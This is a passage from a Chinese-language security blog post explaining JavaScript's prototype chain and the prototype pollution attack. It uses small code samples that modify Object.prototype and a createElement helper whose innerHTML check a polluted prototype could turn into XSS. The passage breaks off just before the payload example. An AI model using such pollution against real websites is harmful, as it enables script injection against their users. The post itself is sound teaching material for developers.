<!DOCTYPE html><html domain="tech-blog.cymetrics.io" ga-id="G-3VBVCXV9Z0" lang="zh-TW"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="CYBER,Cymetrics,Security" name="keywords"><link href="/img/favicon/favicon-192x192.png?hash=42b087227d" rel="icon" type="image/png"><meta content="#5789d3" name="theme-color"><title>基於 JS 原型鏈的攻擊手法：Prototype Pollution</title><meta content="基於 JS 原型鏈的攻擊手法：Prototype Pollution" property="og:title"><meta content="基於 JS 原型鏈的攻擊手法：Prototype Pollution" name="twitter:title"><meta content="summary_large_image" name="twitter:card"><meta content="身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。" name="description"><meta content="身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。" name="twitter:description"><meta content="身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。" property="og:description"><meta content="article" property="og:type"><meta content="https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/" property="og:url"><meta content="Cymetrics Tech Blog" property="og:site_name"><meta content="https://tech-blog.cymetrics.io/img/favicon/favicon-512x512.png" property="og:image"><meta content="https://tech-blog.cymetrics.io/img/favicon/favicon-512x512.png" name="twitter:image"><meta content="hsZQwAip9iIbys-i4PJp_MfpNiA6w6RB0hYdWLiLUuk" name="google-site-verification"><link href="https://tech-blog.cymetrics.io/posts/huli/prototype-pollution/" rel="canonical"><meta content="always" name="referrer"><link href="/feed/feed.xml" rel="alternate" type="application/atom+xml" title="Cymetrics Tech Blog"><link href="/" rel="preconnect" crossorigin=""><script async="" src="/js/min.js?hash=7f26b2ece8" defer=""></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3VBVCXV9Z0"></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3VBVCXV9Z0');</script><script csp-hash="">if (/Mac OS X/.test(navigator.userAgent))document.documentElement.classList.add('apple')</script><style>:root{--primary-color: #5789d3;--primary-dark-color: #ffd349;--fgColor: #2f2f2f;--bgColor: linear-gradient(to top, #efefef, #ffffff);--primary: var(--primary-color);--primary-dark: var(--primary-dark-color);--fg: var(--fgColor);--bg: var(--bgColor);--progressColor: #ffd349;--main-width: calc(100vw - 3em)}main img{content-visibility:auto}article *{scroll-margin-top:50px}header nav{z-index:1;position:fixed;top:0;left:0;width:100vw;background:#fff;font-weight:200;text-align:right;padding:0}@media (min-width:37.5em){:root{--main-width: calc(37.5em - 3em)}}dialog,share-widget{position:fixed;opacity:.9}share-widget{right:20px;bottom:20px;width:50px;height:50px;border-radius:50%;overflow:hidden;box-shadow:2px 3px 5px 2px rgba(0,0,0,.2)}@media screen and (max-width:376px){share-widget{display:none}}share-widget div{margin-left:50%;transform:translateX(-50%);width:20px;height:20px;background-image:url(/img/share.svg);background-repeat:no-repeat;background-position:center;background-size:contain}.apple share-widget div{background-image:url(/img/share-apple.svg)}share-widget button{margin:0;padding:0;width:100%;height:100%;transition:.3s}share-widget button:active{transform:scale(1.2)}dialog{background-color:var(--primary-dark);z-index:1000;font-size:14px}#reading-progress{z-index:1;background-color:var(--progressColor);width:100vw;position:absolute;left:0;bottom:0;height:2px;transform:translate(-100vw,0);will-change:transform;pointer-events:none}#posts li{margin-bottom:.5em}html{line-height:1.15;-webkit-text-size-adjust:100%;font-family:"Open Sans",-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans","Helvetica Neue",Helvetica,Arial,"Noto Sans TC","PingFang TC","Hiragino Sans GB","Heiti TC","Microsoft YaHei","Microsoft Jhenghei",sans-serif;--font-family: "Open Sans", -apple-system, system-ui, BlinkMacSystemFont,
    "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Helvetica, Arial,
    "Noto Sans TC", "PingFang TC", "Hiragino Sans GB", "Heiti TC",
    "Microsoft YaHei", "Microsoft Jhenghei", sans-serif}body{margin:0}body.lock{overflow:hidden}a{background-color:transparent;text-underline-offset:2px;text-decoration:none;color:var(--primary)}b{font-weight:700}img{border-style:none;max-width:100%;height:auto;margin:0 auto}button,input{font-family:inherit;font-size:100%;line-height:1.15;overflow:visible}button{text-transform:none}input{margin:0}[type=button],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}template{display:none}h2{font-size:2.5em;line-height:1.2;margin-bottom:.6em;line-height:2.4rem;margin-bottom:1.36rem;font-size:1.728rem}body,ol,p,pre{font-size:1em}ol,p,pre{margin-bottom:1.5em}body,ol,p,pre{font-size:1rem;line-height:1.6}ol,p,pre{margin-bottom:1.36rem}@media (min-width:600px){h2{font-size:2.0097rem;line-height:2.52rem}body,ol,p,pre{font-size:1.1rem;line-height:1.6}h2,ol,p,pre{margin-bottom:1.496rem}}@media (min-width:1200px){h2{font-size:2.05rem}body,ol,p,pre{font-size:1.2rem;line-height:1.6}h2,ol,p,pre{margin-bottom:1.632rem}}code,pre{overflow-x:auto}pre{font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace}pre code:not([class]){overflow-x:scroll}code{border-radius:.3em;color:#e33671;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:90%}h1,h2{font-family:var(--font-family)}a:hover{text-decoration:underline}@media (max-width:767px){x:-moz-any-link{display:table-cell}}button,input{border-radius:.3em;max-width:100%}input{padding:.75em;margin-bottom:1.5em;display:inline}button+label,input+label,label+*{page-break-before:always}button,label{display:inline-block}button{background:#f2f2f2;color:#191919;cursor:pointer;padding:.75em 1.5em;text-align:center;margin:0 .75em 1.5em 0}button:hover{background:#d9d9d9;color:#000}button:not([disabled]){background:#f9c412;color:#181818;background:var(--primary)}button:not([disabled]):hover{background:#ba9005;color:#000;background:var(--primary-dark)}input[type=email],input[type=number],input[type=search],input[type=url]{border:1px solid #595959;padding:.75em}*{border:0;box-sizing:border-box}body{font-family:var(--font-family);background:var(--bg);color:var(--fg)}header label{display:block}article,header{max-width:100%;width:42.5em;margin:0 auto}header{padding:4.5em 24px 0;text-align:center;display:flex;align-items:center;flex-direction:column}header p,ol{margin-top:0}header nav .nav-title{float:left;font-size:inherit;line-height:inherit;margin:0;text-align:left}header nav label{color:#000;cursor:pointer;margin:0;font-style:normal;text-align:right}main{max-width:70rem;margin:0 auto;min-height:60vh}article{padding:1.5em;word-break:break-word}li ol{margin-bottom:0}blockquote{padding:0 1.5em;margin:1.5em 0 1.5em 1.5em;border-left:4px solid var(--primary)}blockquote footer{background:0 0;display:block;color:#ccc;padding:.75em 0;font-size:90%;text-align:start}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.comment,.token.doctype{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.tag{color:#e2777a}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property{color:#f8c555}.token.keyword{color:#cc99cd}.token.attr-value,.token.regex,.token.string{color:#7ec699}.token.operator,.token.url{color:#67cdcc}.token.bold{font-weight:700}.token.inserted{color:green}::-webkit-scrollbar-thumb:hover{background:var(--primary)}.w-full{width:100%}body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color)}@media (prefers-color-scheme:dark){body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color)}}h1{font-size:32px;line-height:1.25;margin:.67em 0;text-align:left}header aside{font-size:16px;color:#4b4b4b}.post,footer{border-top:1px solid #ccc}.post{padding-top:35px;margin-top:35px}.menu__btn{display:inline-block;width:24px;height:24px;position:relative}.menu__btn span{opacity:0;width:1px;height:1px;overflow:hidden;display:block}.menu__btn::after,.menu__btn::before{content:"";position:absolute;top:51%;left:50%;height:2px;width:17px;background-color:#2d2d2d;border-radius:.1rem}.menu__btn::before{transform:translate(-50%,-50%);box-shadow:0 .3rem 0 #2d2d2d,0 -.3rem 0 #2d2d2d}.menu__btn::after{display:none;transform:translate(-50%,-50%) rotate(90deg)}.menu__btn.menu__btn--close{z-index:9;transform:rotate(45deg)}.menu__btn.menu__btn--close::before{box-shadow:none}.menu__btn.menu__btn--close::after{display:block}#nav,#nav .nav-title{display:flex;align-items:center}#nav{position:relative;height:68px;z-index:2}#nav .nav-title{padding:.375rem 1.5rem;width:100%;justify-content:space-between}#nav .nav-title *,.article-footer img{margin:0}.nav__links{display:none;flex-direction:column;position:fixed;z-index:3;top:0;left:0;right:0;bottom:0;padding:86px 48px 0;background-image:linear-gradient(to top,#efefef,#fff),linear-gradient(to bottom,#f9f9f9,#f9f9f9)}.nav__links--open{display:flex}.nav__links a{text-align:left;width:100%;padding:.5rem 0;transition:all .3s ease-out;font-weight:700;text-decoration:none;color:var(--fg)}.nav__links a:hover{color:var(--primary-color)}.nav-logo{width:260px;height:40px;background:url(/img/logo1.png) no-repeat center center;background-size:contain}footer{margin-top:48px;font-size:14px;padding:24px;text-align:center}.copyright{display:inline-block}footer>*{margin:.5em}.footer-logos{display:flex;align-items:center;justify-content:center}.footer-logos a:not(:first-child){margin-left:32px}.post-tags{display:flex;gap:0 16px;flex-wrap:wrap}.direct-link{display:none}.post-avatar{margin-top:27px;display:flex;align-items:center;height:36px}.post-avatar__img{width:36px;height:36px;overflow:hidden;margin:0;border-radius:50%}.post-avatar__time{font-size:13px}.post-avatar__info{margin-left:8px;color:#747474;text-align:left}.post-avatar__author{font-size:14px;font-weight:700}.article-footer{margin-top:40px;border-bottom:1px solid #ccc;padding-bottom:52px}.article-footer a{float:right;display:flex;align-items:center;color:var(--fg);font-weight:700;margin-left:4px}.article-author{margin-top:34px;display:flex;align-items:flex-start;margin-bottom:48px}.article-author__img{width:80px;height:80px;overflow:hidden;margin:0;border-radius:50%;flex-shrink:0}.article-author__info{margin-left:16px;text-align:left}.article-author__title{color:#747474;font-size:16px}.article-author__author{font-size:22px;font-weight:700;line-height:1em}.article-author__intro{color:#2f2f2f;margin-top:8px}@media (min-width:768px){h1{font-size:48px}header aside{font-size:20px}header nav a:first-of-type{margin-left:auto}header nav a:last-of-type{margin-right:1.5em}.menu__btn{display:none}#nav,footer{max-width:1168px}#nav{height:80px;margin:0 auto}.nav-logo{width:313px}.nav__links{display:flex;flex-direction:row;position:static;padding:0;background-image:none}.nav__links a{text-align:center;margin-left:56px}footer{display:flex;flex-direction:row-reverse;justify-content:space-between;align-items:center;margin-left:auto;margin-right:auto}}.notice-block{text-align:left;background:rgba(87,137,211,.2);padding:16px;margin-top:24px;border-radius:8px}</style></head><body><header><nav><div id="nav"><div class="nav-title"><a href="/" class="nav-logo" title="Homepage"></a> <label class="menu__btn" for="menu__control"><span>Menu</span></label></div><div class="nav__links"><a href="/archive/">Archive</a> <a href="/tags/">Tags</a> <a href="/about/">About</a> <a href="/en">English</a></div></div><div id="reading-progress" aria-hidden="true"></div></nav><h1 class="w-full">基於 JS 原型鏈的攻擊手法：Prototype Pollution</h1><aside class="w-full"><div class="post-tags"><a href="/tags/security/" class="post-tag">#Security</a> <a href="/tags/front-end/" class="post-tag">#Front-end</a></div><div class="post-avatar"><img alt="huli" src="/img/authors/huli_logo.jpg" class="post-avatar__img" data-deopt="true"><div class="post-avatar__info"><div class="post-avatar__author"><a href="/posts/huli">huli</a></div><div class="post-avatar__time">29 Sep 2021</div></div></div><div class="notice-block" data-nosnippet="" style="display:none;">我們正在尋找一位 Security Engineer 加入我們的團隊，詳情請參考<a href="https://github.com/cymetrics/blog/issues/13" rel="noopener noreferrer" target="_blank">職缺資訊</a></div></aside><dialog id="message"></dialog></header><main><article><div id="post-page"></div><h2 id="%E5%89%8D%E8%A8%80"><a href="#%E5%89%8D%E8%A8%80" class="direct-link">#</a> 前言</h2><p>身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。</p><p>但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。</p><h2 id="%E5%8E%9F%E5%9E%8B%E9%8F%88"><a href="#%E5%8E%9F%E5%9E%8B%E9%8F%88" class="direct-link">#</a> 原型鏈</h2><p>JavaScript 中的物件導向跟其他程式語言比較不一樣，你現在看到的 <code>class</code> 那是 ES6 以後才有的語法，在這之前都是用 <code>prototype</code> 來做這件事情，又稱為原型繼承。</p><p>舉個例子好了，你有沒有想過當你在用一些內建函式的時候，這些函式是從哪裡來的？</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">"a"</span><br><span class="token keyword">var</span> str2 <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment">// repeat 是哪裡來的？</span></code></pre><p>甚至你會發現，兩個不同字串的 repeat 方法，其實是同一個 function：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">"a"</span><br><span class="token keyword">var</span> str2 <span class="token operator">=</span> <span class="token string">"b"</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>repeat <span class="token operator">===</span> str2<span class="token punctuation">.</span>repeat<span class="token punctuation">)</span> <span class="token comment">// true</span></code></pre><p>或是如果你曾經查過 MDN，會發現標題不是 repeat，而是 <code>String.prototype.repeat</code>：</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/prototype-pollution/1-repeat-1920w.webp 1920w, /img/posts/huli/prototype-pollution/1-repeat-1280w.webp 1280w, /img/posts/huli/prototype-pollution/1-repeat-840w.webp 840w, /img/posts/huli/prototype-pollution/1-repeat-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/prototype-pollution/1-repeat-1920w.png 1920w, /img/posts/huli/prototype-pollution/1-repeat-1280w.png 1280w, /img/posts/huli/prototype-pollution/1-repeat-840w.png 840w, /img/posts/huli/prototype-pollution/1-repeat-320w.png 320w" type="image/png"><img alt="string.prototype.repeat" src="/img/posts/huli/prototype-pollution/1-repeat-1920w.png" height="606" width="2338" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2338 606'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAECAYAAABREWWJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoElEQVQImS2OWw6EIBAEvf/1fMX4LcprERZQI6Y2ku2kvjoz1Y11O6uybOaD3QPWeaz/4r8JF2JlDxHvPc45Yoyc51lplLFoY2rxJufMMAx0Xcc8z/R9zzRNlbZtCSHwPA+lFBoTMld56uGb+74RQrCuAikl27axLAta6ypIKVVBNYtPQPtE+T94Zw3jiFQKqTSLWHG75zivSj4OUn7J/AAs1eOAk8uSYAAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>而這一切的一切，都與 prototype 有關。</p><p>當你在呼叫 <code>str.repeat</code> 的時候，並不是 str 這個 instance 上面真的有一個方法叫做 repeat，那既然如此，JS 引擎背後是怎麼運作的？</p><p>還記得 scope 的概念嗎？假設我用了一個變數，local scope 找不到，JS 引擎就會去上一層 scope 找，然後一路找到 global scope 為止，這又稱為 scope chain，JS 引擎沿著這條鏈不斷往上尋找，直到最頂端才停下來。</p><p>Prototype chain 的概念其實是一模一樣的，但差別在於：「JS 引擎怎麼知道上一層是哪裡？」，如果 JS 引擎在 <code>str</code> 身上找不到 repeat 這個 function，那它該去哪裡找呢？</p><p>在 JS 中有一個隱藏的屬性，叫做 <code>__proto__</code>，它儲存的值就是 JS 引擎應該往上找的地方。</p><p>例如說：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">""</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span> <span class="token comment">// String.prototype</span></code></pre><p><code>str.__proto__</code> 所指向的東西，就是 JS 引擎在 str 身上找不到東西時，應該去的「上一層」，而這個上一層會是 <code>String.prototype</code>。</p><p>這解釋了為什麼 MDN 上面不寫 repeat，而是寫 <code>String.prototype.repeat</code>，因為這才是 repeat function 的全名，這個 repeat 函式其實是存在於 <code>String.prototype</code> 這個物件上的一個方法。</p><p>因此，當你在呼叫 <code>str.repeat</code> 的時候，其實就是在呼叫 <code>String.prototype.repeat</code>，而這就是原型鏈的原理跟運作方式。</p><p>除了字串以外，其他東西也是一樣的，例如說物件：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// undefined</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>toString<span class="token punctuation">)</span> <span class="token comment">// ƒ toString() { [native code] }</span></code></pre><p>明明 obj 就是一個空物件，為什麼 <code>obj.toString</code> 有東西？因為 JS 引擎在 obj 找不到，所以就去 <code>obj.__proto__</code> 找，而這個 <code>obj.__proto__</code> 所指向的地方是 <code>Object.prototype</code>，所以 <code>obj.toString</code> 最後找到的其實是 <code>Object.prototype.toString</code>。</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>toString <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">)</span> <span class="token comment">// true</span></code></pre><h2 id="%E6%94%B9%E8%AE%8A%E9%A0%90%E8%A8%AD-prototype-%E4%B8%8A%E7%9A%84%E5%B1%AC%E6%80%A7"><a href="#%E6%94%B9%E8%AE%8A%E9%A0%90%E8%A8%AD-prototype-%E4%B8%8A%E7%9A%84%E5%B1%AC%E6%80%A7" class="direct-link">#</a> 改變預設 prototype 上的屬性</h2><p>字串的 <code>__proto__</code> 會是 <code>String.prototype</code>，數字的 <code>__proto__</code> 會是 <code>Number.prototype</code>，而陣列的則是 <code>Array.prototype</code>，這些關聯都是已經預設好的了，原因就是要讓這些類別的東西可以共用同一個 function。</p><p>如果每一個字串都有自己的 <code>repeat</code>，那一百萬個字串就有一百萬個不同的 repeat，但其實做的事情都一樣，聽起來不太合理對吧？所以透過 prototype ，我們就可以把 <code>repeat</code> 放在 <code>String.prototype</code>，這樣每個字串在使用這個函式時，呼叫到的都會是同一個函式。</p><p>你可能會好奇說，既然呼叫到的是同個函式，參數也都一樣，那函式要怎麼區分出是不同的字串在呼叫它？</p><p>答案就是：this，底下直接看個例子：</p><pre class="language-js"><code class="language-js"><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function function-variable">first</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><br><span class="token punctuation">}</span><br><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// undefined</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// a</span></code></pre><p>首先，我在 <code>String.prototype</code> 上面加了一個方法叫做 <code>first</code>，所以當我呼叫 <code>"".first</code> 的時候，JS 引擎沿著 <code>__proto__</code> 找到了 <code>String.prototype</code>，發現了 <code>String.prototype.first</code> 是存在的，就呼叫了這個函式。</p><p>而又因為 this 的規則，當 <code>"".first()</code> 這樣寫的時候，在 <code>first</code> 中拿到的 this 會是 <code>""</code>；若呼叫的是 <code>"abc".first()</code>，<code>first</code> 中拿到的 this 就會是 <code>"abc"</code>，因此我們可以用 this 來區分現在是誰在呼叫。</p><p>像上面那樣 <code>String.prototype.first</code> 的寫法，就是直接去修改 String 的原型，加上一個新的方法，讓所有字串都可以用到這個新的 method。雖然很方便沒錯，但是這樣的方式在開發上是不被推薦的，有一句話是這樣說的：<a href="https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/" rel="noopener noreferrer" target="_blank">Don't modify objects you don't own</a>。例如說 MooTools 就因為做了類似的事情，導致一個 array 的 method 要換名稱，詳情請看我以前寫過的：<a href="https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/" rel="noopener noreferrer" target="_blank">Don’t break the Web：以 SmooshGate 以及<keygen>為例</a>。</p><p>然後，既然 <code>String.prototype</code> 可以修改，那理所當然 <code>Object.prototype</code> 也可以修改，像是這樣：</p><pre class="language-js"><code class="language-js"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">123</span><br><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 123</span></code></pre><p>因為修改了 <code>Object.prototype</code> 的緣故，所以在存取 <code>obj.a</code> 的時候，JS 引擎在 obj 身上找不到 a 這個屬性，於是去 <code>obj.__proto__</code> 也就是 <code>Object.prototype</code> 找，在那上面找到了 a，於是就回傳這個 a 的值。</p><p>當程式出現漏洞，導致可以被攻擊者拿去改變原型鏈上的屬性，就叫做 prototype pollution。Pollution 是污染的意思，就像上面這個 object 的例子，我們透過 <code>Object.prototype.a = 123</code> 「污染」了物件原型上的 <code>a</code> 這個屬性，導致程式在存取物件時，有可能出現意想不到的行為。</p><p>那這會造成什麼後果呢？</p><h2 id="%E6%B1%A1%E6%9F%93%E4%BA%86%E5%B1%AC%E6%80%A7%E4%BB%A5%E5%BE%8C%E5%8F%AF%E4%BB%A5%E5%B9%B9%E5%98%9B%EF%BC%9F"><a href="#%E6%B1%A1%E6%9F%93%E4%BA%86%E5%B1%AC%E6%80%A7%E4%BB%A5%E5%BE%8C%E5%8F%AF%E4%BB%A5%E5%B9%B9%E5%98%9B%EF%BC%9F" class="direct-link">#</a> 污染了屬性以後可以幹嘛？</h2><p>假設今天網站上有個搜尋功能，會從 query string 裡面拿 <code>q</code> 的值，然後寫到畫面上去，呈現出來像是這樣：</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/prototype-pollution/2-search-1920w.webp 1920w, /img/posts/huli/prototype-pollution/2-search-1280w.webp 1280w, /img/posts/huli/prototype-pollution/2-search-840w.webp 840w, /img/posts/huli/prototype-pollution/2-search-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/prototype-pollution/2-search-1920w.png 1920w, /img/posts/huli/prototype-pollution/2-search-1280w.png 1280w, /img/posts/huli/prototype-pollution/2-search-840w.png 840w, /img/posts/huli/prototype-pollution/2-search-320w.png 320w" type="image/png"><img alt="search" src="/img/posts/huli/prototype-pollution/2-search-1920w.png" height="328" width="1412" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1412 328'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAECAYAAACHtL/sAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAUUlEQVQYlY2OQQrAMAgE8/8PejFg0AdIknO2KOmtTTsgI6iLpdaK1hqYGaoKEQERwcyw1kJw+4nSe8cYA+E5Z9rds/8V8DrZnI4zIBZO9fXBBTPF+yzp8CPkAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>而整段程式碼是這樣寫的：</p><pre class="language-js"><code class="language-js"><span class="token comment">// 從網址列上拿到 query string</span><br><span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><br><span class="token comment">// 放上畫面，為了避免 XSS 用 innerText</span><br>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token punctuation">{</span><br>  tag<span class="token operator">:</span> <span class="token string">'h2'</span><span class="token punctuation">,</span><br>  innerText<span class="token operator">:</span> <span class="token template-string"><span class="token string template-punctuation">`</span><span class="token string">Search result for </span><span class="token interpolation"><span class="token punctuation interpolation-punctuation">${</span>qs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span><span class="token punctuation interpolation-punctuation">}</span></span><span class="token string template-punctuation">`</span></span><br><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><br><span class="token comment">// 簡化建立元件用的函式</span><br><span class="token keyword">function</span> <span class="token function">createElement</span><span class="token punctuation">(</span><span class="token parameter">config</span><span class="token punctuation">)</span><span class="token punctuation">{</span><br>  <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>tag<span class="token punctuation">)</span><br>  <span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> config<span class="token punctuation">.</span>innerHTML<br>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><br>    element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> config<span class="token punctuation">.</span>innerText<br>  <span class="token punctuation">}</span><br>  <span class="token keyword">return</span> element<br><span class="token punctuation">}</span></code></pre><p>上面這段程式碼應該沒什麼問題對吧？我們寫了一個 function <code>createElement</code> 幫我們簡化一些步驟，根據傳進來的 config 決定要產生什麼元件。為了避免 XSS，所以我們用 <code>innerText</code> 而不是 <code>innerHTML</code>，萬無一失，絕對不會有 XSS！</p><p>看起來是這樣沒錯，但如果在執行到這一段程式碼以前有個 prototype pollution 的漏洞，能讓攻擊者污染到原型上的屬性呢？例如說像是這樣：</p><pre class="language-js"><code 